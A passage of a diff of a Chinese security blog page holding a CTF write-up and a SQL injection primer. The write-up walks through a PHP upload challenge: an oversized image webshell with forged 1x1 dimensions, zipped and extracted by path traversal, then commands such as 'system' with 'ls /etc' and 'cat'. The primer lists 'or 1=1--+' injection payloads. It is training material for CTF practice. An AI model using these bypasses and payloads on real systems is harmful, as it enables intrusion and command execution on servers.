$zip-&gt;extractTo($pos_for_zip);</span><br><span class="line">    $zip-&gt;close();</span><br><span class="line">    unlink($name_for_zip);</span><br><span class="line">    $files = glob(&quot;$pos_for_zip/*&quot;);</span><br><span class="line">    foreach($files as $file)&#123;</span><br><span class="line">        if (is_dir($file)) &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">        $first = imagecreatefrompng($file);</span><br><span class="line">        $size = min(imagesx($first), imagesy($first));</span><br><span class="line">        $second = imagecrop($first, [&#x27;x&#x27; =&gt; 0, &#x27;y&#x27; =&gt; 0, &#x27;width&#x27; =&gt; $size, &#x27;height&#x27; =&gt; $size]);</span><br><span class="line">        if ($second !== FALSE) &#123;</span><br><span class="line">            $final_name = pathinfo($file)[&quot;basename&quot;];</span><br><span class="line">            imagepng($second, &#x27;example/&#x27;.$final_name);</span><br><span class="line">            imagedestroy($second);</span><br><span class="line">        &#125;</span><br><span class="line">        imagedestroy($first);</span><br><span class="line">        unlink($file);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>通过对代码的审计，我们知道?ctf=upload的时候可以上传文件，因此我们可以制造表单进行上传</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;POST数据包POC&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;&lt;form action=&quot;http://270d00af-27b8-4527-a8bd-786af2f51c5e.node3.buuoj.cn/?ctf=upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;!--链接是当前打开的题目链接--&gt;</span><br><span class="line">    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;postedFile&quot; id=&quot;postedFile&quot;&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-<p>而通过代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$imageinfo = getimagesize($_FILES[&#x27;postedFile&#x27;][&#x27;tmp_name&#x27;]);</span><br></pre></td></tr></table></figure>
-<p>getimagesize()函数是获取图片的尺寸和大小，其中$_FILES[‘postedFile’][‘tmp_name’]是文件上传后服务端存储的临时文件名，因此我们可知需要我们上传图片，同时通过代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> if ($_FILES[&#x27;postedFile&#x27;][&#x27;size&#x27;] &gt; 1024*512) &#123;</span><br><span class="line">        die(&quot;这么大个的东西你是想d我吗？&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">if ($imageinfo[0] !== 1 &amp;&amp; $imageinfo[1] !== 1) &#123;</span><br><span class="line">        die(&quot;东西不能方方正正的话就很讨厌&quot;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-<p>我们可知我们上传的文件的大小要超过1024<em>512，但是文件的宽要为1，高也要为1，因此可以制造一个图片马，图片马的大小超过1024</em>512，来绕过($_FILES[‘postedFile’][‘size’] &gt; 1024*512)，而使用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define width 1</span><br><span class="line">#define height 1</span><br></pre></td></tr></table></figure>
-<p>伪造文件的宽和高来绕过$imageinfo[0] !== 1 &amp;&amp; $imageinfo[1] !== 1，可以通过抓包将这两条代码放在文件尾部（zip文件一般放在尾部），这是由于通过扫描文件，可以知道还有一个example.php文件，代码为：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">if (!isset($_GET[&quot;ctf&quot;])) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&quot;ctf&quot;]))</span><br><span class="line">    $ctf = $_GET[&quot;ctf&quot;];</span><br><span class="line"></span><br><span class="line">if($ctf==&quot;poc&quot;) &#123;</span><br><span class="line">    $zip = new \ZipArchive();</span><br><span class="line">    $name_for_zip = &quot;example/&quot; . $_POST[&quot;file&quot;];</span><br><span class="line">    if(explode(&quot;.&quot;,$name_for_zip)[count(explode(&quot;.&quot;,$name_for_zip))-1]!==&quot;zip&quot;) &#123;</span><br><span class="line">        die(&quot;要不咱们再看看？&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if ($zip-&gt;open($name_for_zip) !== TRUE) &#123;</span><br><span class="line">        die (&quot;都不能解压呢&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    echo &quot;可以解压，我想想存哪里&quot;;</span><br><span class="line">    $pos_for_zip = &quot;/tmp/example/&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]);</span><br><span class="line">    $zip-&gt;extractTo($pos_for_zip);</span><br><span class="line">    $zip-&gt;close();</span><br><span class="line">    unlink($name_for_zip);</span><br><span class="line">    $files = glob(&quot;$pos_for_zip/*&quot;);</span><br><span class="line">    foreach($files as $file)&#123;</span><br><span class="line">        if (is_dir($file)) &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">        $first = imagecreatefrompng($file);</span><br><span class="line">        $size = min(imagesx($first), imagesy($first));</span><br><span class="line">        $second = imagecrop($first, [&#x27;x&#x27; =&gt; 0, &#x27;y&#x27; =&gt; 0, &#x27;width&#x27; =&gt; $size, &#x27;height&#x27; =&gt; $size]);</span><br><span class="line">        if ($second !== FALSE) &#123;</span><br><span class="line">            $final_name = pathinfo($file)[&quot;basename&quot;];</span><br><span class="line">            imagepng($second, &#x27;example/&#x27;.$final_name);</span><br><span class="line">            imagedestroy($second);</span><br><span class="line">        &#125;</span><br><span class="line">        imagedestroy($first);</span><br><span class="line">        unlink($file);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>通过审计代码，可知我们要上传的是zip文件，因此我们需要将图片马文件压缩为zip文件，而后通过构造?ctf=poc对文件进行解压，通过两个文件的代码可知道文件解压到example../image/目录下，因此可以再get提交?ctf=poc的同时，post提交file=../image/a.zip（上传的压缩包名）</p>
-<p>然后我们可以get提交0=system，同时post提交1=ls+/etc来访问系统配置文件，最后找到flag文件所在处，用1=cat+/文件路径打开文件进行读取</p>
-<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/jiangdie666/article/details/116997461">https://blog.csdn.net/jiangdie666/article/details/116997461</a></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-Mysql基础知识" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2020/08/27/Mysql%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="article-date">
-  	<time datetime="2020-08-26T16:00:00.000Z" itemprop="datePublished">2020-08-27</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/08/27/Mysql%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">
-        Mysql的基础知识
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="判断sql注入的重要条件"><a href="#判断sql注入的重要条件" class="headerlink" title="判断sql注入的重要条件"></a>判断sql注入的重要条件</h1><ol>
-<li>是否存在错误信息的反馈，如果有，则有sql漏洞（可以利用错误信息的反馈，提交一些恶意代码），反之没有</li>
-</ol>
-<h1 id="基于从服务器接收到的响应"><a href="#基于从服务器接收到的响应" class="headerlink" title="基于从服务器接收到的响应"></a>基于从服务器接收到的响应</h1><ol>
-<li>基于错误的Mysql注入</li>
-<li>联合查询的类型</li>
-<li>堆查询注射</li>
-<li>sql盲注（布尔sql盲注、时间sql盲注、报错sql盲注）</li>
-</ol>
-<h1 id="基于如何处理输入sql查询"><a href="#基于如何处理输入sql查询" class="headerlink" title="基于如何处理输入sql查询"></a>基于如何处理输入sql查询</h1><ol>
-<li>基于字符串</li>
-<li>数字或整数为基础</li>
-</ol>
-<h1 id="基于程度和顺序的注入"><a href="#基于程度和顺序的注入" class="headerlink" title="基于程度和顺序的注入"></a>基于程度和顺序的注入</h1><ol>
-<li>一阶注射（输入注射语句对web产生直接影响，出现结果）</li>
-<li>二阶注射（输入提交的语句不对web产生影响，需要其它的辅助）</li>
-</ol>
-<h1 id="基于注入点的位置"><a href="#基于注入点的位置" class="headerlink" title="基于注入点的位置"></a>基于注入点的位置</h1><ol>
-<li>通过用户输入的表单域的注射</li>
-<li>通过cookie注射</li>
-<li>通过服务器变量注射（基于头部信息的注射）</li>
-</ol>
-<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="系统函数"><a href="#系统函数" class="headerlink" title="系统函数"></a>系统函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. ---version()  Mysql的版本</span><br><span class="line">2. ---user()  数据库用户名</span><br><span class="line">3. ---database()  数据库名</span><br><span class="line">4. ---@@datadir  数据库路径</span><br><span class="line">5. ---@@version_compile_os  操作系统版本 </span><br></pre></td></tr></table></figure>
-
-<h2 id="字符串连接函数"><a href="#字符串连接函数" class="headerlink" title="字符串连接函数"></a>字符串连接函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. ---concat(str1,str2,...)  没有分隔符地连接字符串</span><br><span class="line">2. ---concat_ws(separator,str1,str2,...)  含有分隔符地连接字符串</span><br><span class="line">3. ---group_concat(str1,str2,...)  连接一个组的所有字符串，并以逗号分隔每一条数据</span><br></pre></td></tr></table></figure>
-
-<h1 id="尝试的语句"><a href="#尝试的语句" class="headerlink" title="尝试的语句"></a>尝试的语句</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">or 1=1--+</span><br><span class="line">&#x27;or 1=1--+</span><br><span class="line">&quot; or 1=1--+</span><br><span class="line">) or 1=1--+</span><br><span class="line">&#x27;) or 1=1--+</span><br><span class="line">&quot;) or 1=1--+</span><br><span class="line">&quot;)) or 1=1--+</span><br></pre></td></tr></table></figure>
-
-<h1 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h1><ol>
-<li>infromation_schema数据表中存在着mysql服务器所有的数据，如数据库名和数据库表和表栏的数据类型和访问权限等，<br>即这台mysql服务器有多少数据库，数据库里有多少张数据表，表里的字段类型有哪些，各个数据库需要什么权限才能访问<br>都在information_schema这张表中</li>
-<li>mysql服务器中还包含了一些表和视图，提供了访问数据库元数据的方式，元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限，有时用于该信息的的其他术语，包括“数据词典”和“系统目录”</li>
-</ol>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/4/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span>
+      <a class="extend prev" rel="prev" href="/page/4/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/6/">Next &amp;raquo;</a>
     </nav>
   
 </div>
